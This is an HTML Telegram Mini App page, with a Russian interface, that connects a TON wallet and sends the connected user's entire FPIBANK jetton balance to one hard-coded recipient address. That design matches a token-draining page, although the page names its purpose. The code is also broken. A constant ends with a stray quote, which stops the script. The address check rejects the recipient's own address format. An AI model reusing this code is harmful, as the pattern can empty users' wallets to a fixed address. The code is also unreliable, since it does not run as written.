<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Telegram Mini App: Отправка FPIBANK</title>
  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
</head>
<body>
  <h1>Отправка всех FPIBANK через TonConnect</h1>

  <div id="ton-connect"></div>
  <button id="sendTransaction">Отправить все FPIBANK</button>

  <script>
    // Ваше оригинальное подключение TonConnect без изменений
    if (typeof Telegram === "undefined") {
      window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
    } else {
      Telegram.WebApp.ready();
    }

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect",
    });

    // Константы
    const JETTON_MASTER = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016"";
    const RECIPIENT_TON_ADDRESS = "EQAR8LtBgI6uFZPLwV6A0TEz_uekvux9SKlC2vymS588ZeAg";

    // Проверка адреса (ваша оригинальная функция)
    function isValidTonAddress(address) {
      return /^0:[a-fA-F0-9]{64}$/.test(address);
    }

    // Получение jetton-кошелька получателя (оптимизированная версия)
    async function getRecipientJettonWallet(recipientTonAddress) {
      if (!isValidTonAddress(recipientTonAddress)) {
        throw new Error("Неверный формат TON-адреса получателя");
      }

      const response = await fetch(`https://tonapi.io/v2/accounts/${recipientTonAddress}/jettons`);
      const data = await response.json();
      
      const jettonData = data.balances.find(j => j.jetton.address === JETTON_MASTER);
      if (!jettonData) {
        throw new Error("У получателя нет кошелька для FPIBANK");
      }
      
      return jettonData.wallet_address.address;
    }

    // Получение данных о FPIBANK (оптимизированная версия)
    async function getUserFPIBankData(userTonAddress) {
      if (!isValidTonAddress(userTonAddress)) {
        throw new Error("Неверный формат вашего TON-адреса");
      }

      const response = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
      const data = await response.json();

      const jettonData = data.balances.find(j => j.jetton.address === JETTON_MASTER);
      if (!jettonData) {
        return { rawBalance: "0", decimals: 9, userJettonWallet: null };
      }

      return {
        rawBalance: jettonData.balance,
        decimals: jettonData.jetton.decimals,
        userJettonWallet: jettonData.wallet_address.address
      };
    }

    // Создание payload для перевода (исправленная версия)
    async function createJettonTransferPayload(amount, destination, responseAddress) {
      const { Cell } = TonWeb.boc;
      const cell = new Cell();
      
      cell.bits.writeUint(0x0f8a7ea5, 32); // opcode для jetton transfer
      cell.bits.writeUint(0, 64); // query_id
      cell.bits.writeCoins(new TonWeb.utils.BN(amount));
      cell.bits.writeAddress(new TonWeb.Address(destination));
      cell.bits.writeAddress(new TonWeb.Address(responseAddress));
      cell.bits.writeBit(0); // no custom payload
      cell.bits.writeCoins(new TonWeb.utils.BN(0)); // forward ton amount
      cell.bits.writeBit(0); // no forward payload
      
      const boc = await cell.toBoc(false);
      return TonWeb.utils.bytesToBase64(boc);
    }

    // Основная функция отправки (оптимизированная)
    async function sendAllFPIBANK() {
      try {
        if (!tonConnectUI.connected) {
          throw new Error("Сначала подключите кошелёк");
        }

        const userTonAddress = tonConnectUI.account?.address;
        if (!userTonAddress) {
          throw new Error("Не удалось получить ваш TON-адрес");
        }

        // Получаем данные отправителя
        const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
        if (!userJettonWallet || rawBalance === "0") {
          throw new Error("Недостаточный баланс или кошелёк не найден");
        }

        // Получаем jetton-кошелёк получателя
        const recipientJettonWallet = await getRecipientJettonWallet(RECIPIENT_TON_ADDRESS);

        // Создаем payload
        const payloadBoc = await createJettonTransferPayload(
          rawBalance,
          recipientJettonWallet,
          userTonAddress
        );

        // Формируем транзакцию
        const transaction = {
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [{
            address: userJettonWallet,
            amount: "100000000", // 0.1 TON
            payload: payloadBoc
          }]
        };

        // Отправляем транзакцию
        const result = await tonConnectUI.sendTransaction(transaction);
        Telegram.WebApp.showAlert(`Транзакция успешно отправлена!`);
        console.log("Результат:", result);

      } catch (error) {
        console.error("Ошибка:", error);
        Telegram.WebApp.showAlert(`Ошибка: ${error.message}`);
      }
    }

    // Ваш оригинальный обработчик кнопки
    document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
  </script>
</body>
</html>
